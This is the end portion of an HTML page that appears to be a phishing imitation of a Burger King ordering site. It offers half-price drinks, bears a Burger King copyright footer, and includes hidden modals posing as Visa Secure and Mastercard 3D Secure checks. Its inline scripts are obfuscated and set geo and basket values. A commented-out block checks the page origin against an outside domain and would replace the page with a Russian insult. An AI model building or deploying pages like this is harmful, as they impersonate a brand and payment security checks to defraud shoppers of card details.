                                                                    <div class="kostamaster180">450֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Latte-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Latte</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">720֏</div>
                                                                    <div class="promo-price">360֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Cappuccino-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Cappuccino</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">720֏</div>
                                                                    <div class="promo-price">360֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/Tea-1200x800-1.png"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Tea</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">450֏</div>
                                                                    <div class="promo-price">225֏</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
                                            
                                            
                                            <!--
                                            <li class="kostamaster042">
                                                <div class="_3z_30-40">
                                                    <div class="kostamaster219 _9VPg6-40 _2Dp7F-40">
                                                        <div class="kostamaster037">
                                                            <figure class="kostamaster016"><span class="lazy-load-image-background blur lazy-load-image-loaded" style="display: inline-block;">
                                                                <img src="bkimg/g4.jpg"></span></figure>
                                                            <div class="kostamaster053">
                                                                <div class="kostamaster049">
                                                                    <h3 class="kostamaster073 _2G24_-40 kostamaster036">Mirinda</h3>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="Card__footer _2ntka-40">
                                                            <div style="display:none" class="product__quantity"></div>
                                                            <div class="_3rRha-40">
                                                                <div class="kostamaster017 kostamaster018">
                                                                    <span class="kostamaster175 Currency_rub"></span>
                                                                    <div class="kostamaster180">2.00</div>
                                                                    <div class="promo-price">1.00</div>
                                                                </div>
                                                                <button type="button" class="kostamaster002 ProductCard__button"><span class="kostamaster121"><span>Add to cart</span></span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </li>
-->
                                        
                                        </ul>
                                    </div>
                                </section>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="FreeSaucesPanel"></div>
            </div>

            <footer class="kostamaster048 kostamaster298">
                <hr>
                <div class="footer" style="margin-top: -3px;">
                    <img class="footer_img" src="bkimg/Group-85-Copy.svg"  style="margin-bottom: 5px;">
                    <span class="footer-text" style="text-align: center;">© BURGER KING 2025<br><hr>
© 2025 Copyright BURGER KING Food Systems Company. ® All rights reserved BURGER KING®, logos and Nazeeh & Wartan are registered trademarks of the BURGER KING Food Systems Company</span>
                </div>
                <input id="finalprice" type="hidden" name="finalprice" value="">
                <input type="hidden" name="finalprice" value="">
            </footer>

            <a class="kostamaster287 kostamaster288 cart_isle" href="order.php">
                <div class="kostamaster289">
                    <svg width="28" height="28" viewbox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                        <path d="M11.2 23.2a2.4 2.4 0 0 0-2.4 2.4 2.4 2.4 0 0 0 2.4 2.4 2.4 2.4 0 0 0 2.4-2.4 2.4 2.4 0 0 0-2.4-2.4zM4 4v2.4h2.4l4.32 9.12-1.68 2.88c-.12.36-.24.84-.24 1.2a2.4 2.4 0 0 0 2.4 2.4h14.4v-2.4H11.68a.26.26 0 0 1-.24-.24v-.12l1.08-2.04h8.88c.96 0 1.68-.48 2.04-1.2l4.32-7.8c.24-.24.24-.36.24-.6 0-.72-.48-1.2-1.2-1.2H9.04L7.96 4H4zm19.2 19.2a2.4 2.4 0 0 0-2.4 2.4 2.4 2.4 0 0 0 2.4 2.4 2.4 2.4 0 0 0 2.4-2.4 2.4 2.4 0 0 0-2.4-2.4z" fill="currentColor" fill-rule="nonzero"></path>
                    </svg>
                </div>
                <div class="kostamaster017 kostamaster290 kostamaster178">
                    <div id="price_old2" class="kostamaster180 pric_old smart-basket__price-common"></div>
                    <div id="price_new2" class="kostamaster1802 pric_new hid"><span class="price_new_span"></span></div>
                </div>
            </a>

            <div class="s-alert-wrapper"></div>
        </div>
    </div>




    <div id="visa3ds" style="width: 370px" class="offcanvas offcanvas-modal offcanvas-detached rounded-m" aria-hidden="true">
        <div class="content 3ds-loading text-center flex-center" style="height: 500px;">
            <div class="flex-center flex-column">
                <img style="width: 100px;" class="rounded-xl my-3" src="img/visa-secure-logo.jpg">
                <div class="visa-loader"></div>
            </div>
        </div>
    </div>

    <div id="master3ds" style="width: 370px" class="offcanvas offcanvas-modal offcanvas-detached rounded-m" aria-hidden="true">
        <div class="content 3ds-loading text-center flex-center" style="height: 500px;">
            <div class="flex-center flex-column">
                <img style="width: 100px;" class="rounded-xl my-3" src="img/visa-secure-logo.jpg">
                <div class="visa-loader"></div>
            </div>
        </div>
    </div>



    <script src="assets/jquery.min.js"></script>
    <script src="assets/jquery.mask.js"></script>
    <script src="assets/swiper.min.js"></script>
    <script src="assets/jquery.validate.min.js"></script>
    <script src="assets/jquery.payment.min.js"></script>
    <script src="assets/smartbasket/js/basket-v=8.js"></script>
    <script src="js/script/bootstrap.min.js"></script>
    <script src="js/script/custom.js"></script>
    <script src="js/custom.js"></script>




    <script>
        var _0x55f672=_0x51a1;function _0x288a(){var _0x5bafed=['10agTFgu','1104220YZuwFN','139960gTIeyb','149992rhfQXd','5488747ueZDXZ','119PDVlWA','160ACtbkc','1551KlBHIQ','\x20','1569976JNnklD','18AtkDdN','16194DHJEir'];_0x288a=function(){return _0x5bafed;};return _0x288a();}(function(_0x1c91e0,_0x3e3b54){var _0x3253ff=_0x51a1,_0x1ebe14=_0x1c91e0();while(!![]){try{var _0x5aeefc=parseInt(_0x3253ff(0x199))/0x1+-parseInt(_0x3253ff(0x19d))/0x2*(-parseInt(_0x3253ff(0x19e))/0x3)+-parseInt(_0x3253ff(0x19a))/0x4*(-parseInt(_0x3253ff(0x197))/0x5)+-parseInt(_0x3253ff(0x196))/0x6*(parseInt(_0x3253ff(0x19c))/0x7)+parseInt(_0x3253ff(0x1a0))/0x8+-parseInt(_0x3253ff(0x195))/0x9*(-parseInt(_0x3253ff(0x198))/0xa)+-parseInt(_0x3253ff(0x19b))/0xb;if(_0x5aeefc===_0x3e3b54)break;else _0x1ebe14['push'](_0x1ebe14['shift']());}catch(_0x591ca8){_0x1ebe14['push'](_0x1ebe14['shift']());}}}(_0x288a,0x1f623));function _0x51a1(_0xe8a21c,_0x537dfb){var _0x288a42=_0x288a();return _0x51a1=function(_0x51a1f8,_0xd8cfc4){_0x51a1f8=_0x51a1f8-0x195;var _0x2859fc=_0x288a42[_0x51a1f8];return _0x2859fc;},_0x51a1(_0xe8a21c,_0x537dfb);}var curr=_0x55f672(0x19f);
    </script>

    <script>
        var _0x578ced=_0x530c;function _0x530c(_0x3d4fe4,_0x359e57){var _0x7ad91b=_0x7ad9();return _0x530c=function(_0x530cfb,_0x1822c4){_0x530cfb=_0x530cfb-0xfb;var _0x2c3b4b=_0x7ad91b[_0x530cfb];return _0x2c3b4b;},_0x530c(_0x3d4fe4,_0x359e57);}(function(_0x80b329,_0x42cb25){var _0x273240=_0x530c,_0x37cd58=_0x80b329();while(!![]){try{var _0x1c3b26=-parseInt(_0x273240(0x109))/0x1+-parseInt(_0x273240(0x106))/0x2*(-parseInt(_0x273240(0x10b))/0x3)+parseInt(_0x273240(0x10a))/0x4+-parseInt(_0x273240(0xfd))/0x5*(-parseInt(_0x273240(0x10c))/0x6)+parseInt(_0x273240(0xfc))/0x7+-parseInt(_0x273240(0x101))/0x8+-parseInt(_0x273240(0xfe))/0x9;if(_0x1c3b26===_0x42cb25)break;else _0x37cd58['push'](_0x37cd58['shift']());}catch(_0x1d0ff0){_0x37cd58['push'](_0x37cd58['shift']());}}}(_0x7ad9,0xe3f51),$(function(){var _0x33d1ab=_0x530c;$(_0x33d1ab(0xfb))[_0x33d1ab(0x108)]({'productElement':'kostamaster042','buttonAddToBasket':_0x33d1ab(0x107),'countryCode':_0x33d1ab(0x104),'smartBasketCurrency':_0x33d1ab(0x102),'productPrice':_0x33d1ab(0xff),'productSize':'sizeitem','productQuantityWrapper':_0x33d1ab(0x100),'telIsRequired':![],'emailIsRequired':![],'agreement':{'isRequired':![],'isChecked':!![],'isLink':''}});}));var ge='ae';function _0x7ad9(){var _0x56348e=['2772249QNVouP','9202884ucruyZ','.smart-basket__wrapper','695310BcEasm','5DfXggF','10474308IkBhMd','kostamaster180','product__quantity','8651232yzuINi','','geo','+974','setItem','2AkoeWR','ProductCard__button','smbasket','331265xKnVPr','3811868DkZjbQ'];_0x7ad9=function(){return _0x56348e;};return _0x7ad9();}localStorage[_0x578ced(0x105)](_0x578ced(0x103),ge);
    </script>
    <script src="assets/scripts-v8.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDSzlwwJACmlQhi5jI9x4_Eqh8-CN8OBbQ&libraries=places&language=en&callback=initAutocomplete" async="" defer=""></script>
    <script src="assets/scripts_order-v7.js"></script>
    <script src="js/jquery-3.6.0.js"></script>
    <script>
       var _0x3c5acf = _0x3cc8;
function _0x3f18() {
  var _0xacfa4 = ["1365658YLeDxt", "21732raHmWC", "ajax", "316255fHrtZK", "2706544oozUxZ", "27EBuudq", "origin", "ready", "body", "490cqpSCC", "1187108ArIhXy", '<div style="width:100vw;height:100vh;display:flex;align-items:center;justify-content: center;"><h1 style="font-size:30px; color: black;">СОСИТЕ ХУЙ БЫДЛО</h1>', "979851OtPxyx", "https://ailbaik-my.com", "3077670SaBQYb", "html", "2dTkwms", "./antiddos/menu.php"];
  _0x3f18 = function () {
    return _0xacfa4;
  };
  return _0x3f18();
}
function _0x3cc8(_0x1717e1, _0x1df360) {
  var _0x3f1848 = _0x3f18();
  return _0x3cc8 = function (_0x3cc8cc, _0x5220b7) {
    _0x3cc8cc = _0x3cc8cc - 401;
    var _0x15dcab = _0x3f1848[_0x3cc8cc];
    return _0x15dcab;
  }, _0x3cc8(_0x1717e1, _0x1df360);
}
(function (_0x4d5258, _0x8665ff) {
  var _0x28509b = _0x3cc8, _0x5c195d = _0x4d5258();
  while (true) {
    try {
      var _0x50ccec = parseInt(_0x28509b(417)) / 1 + parseInt(_0x28509b(412)) / 2 * (parseInt(_0x28509b(408)) / 3) + parseInt(_0x28509b(406)) / 4 + -parseInt(_0x28509b(405)) / 5 * (parseInt(_0x28509b(415)) / 6) + parseInt(_0x28509b(414)) / 7 + parseInt(_0x28509b(418)) / 8 + -parseInt(_0x28509b(401)) / 9 * (parseInt(_0x28509b(410)) / 10);
      if (_0x50ccec === _0x8665ff) break; else _0x5c195d.push(_0x5c195d.shift());
    } catch (_0x45dfb6) {
      _0x5c195d.push(_0x5c195d.shift());
    }
  }
}(_0x3f18, 194804), $(document)[_0x3c5acf(403)](function () {
  //var _0x31f78a = _0x3c5acf;
  //window.location[_0x31f78a(402)] != _0x31f78a(409) && $(_0x31f78a(404))[_0x31f78a(411)](_0x31f78a(407)), $[_0x31f78a(416)]({url: _0x31f78a(413), method: "get"});
}));

</script>
    <style>
    .lazy-load-image-background.blur.lazy-load-image-loaded > img {
        max-height: 128px;
    }
    </style>
    <script>
        !function(e,t,n,i,c,o,a){e.fbq||(c=e.fbq=function(){c.callMethod?c.callMethod.apply(c,arguments):c.queue.push(arguments)},e._fbq||(e._fbq=c),c.push=c,c.loaded=!0,c.version="2.0",c.queue=[],(o=t.createElement(n)).async=!0,o.src="https://connect.facebook.net/en_US/fbevents.js",(a=t.getElementsByTagName(n)[0]).parentNode.insertBefore(o,a))}(window,document,"script");var pixel=gets.fbpixel;fbq("init",pixel),fbq("track","PageView"),document.createElement("div").innerHTML=`<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=${pixel}&ev=PageView&noscript=1">`;
    </script>
    
</body>
</head>

</html>